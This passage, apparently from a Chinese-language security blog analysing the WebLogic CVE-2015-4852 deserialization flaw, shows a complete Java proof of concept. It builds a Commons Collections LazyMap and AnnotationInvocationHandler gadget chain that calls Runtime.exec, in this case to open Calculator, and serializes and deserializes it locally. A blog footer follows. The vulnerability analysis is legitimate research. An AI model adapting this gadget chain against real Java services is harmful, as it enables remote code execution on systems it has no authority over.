org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] trans_chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans_chain);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lzMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        <span class="comment">// 通过反射机制实例化AnnotationInvocationHandler</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lzMap);</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap"><span class="toc-number">1.</span> <span class="toc-text">LazyMap</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/08/20/weblogic/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/08/20/weblogic/&text=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/08/20/weblogic/&is_video=false&description=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic CVE-2015-4852 反序列化RCE分析&body=Check out this article: https://blog.b1ank.top/2021/08/20/weblogic/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/08/20/weblogic/&name=Weblogic CVE-2015-4852 反序列化RCE分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/08/20/weblogic/&t=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    b1ank
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
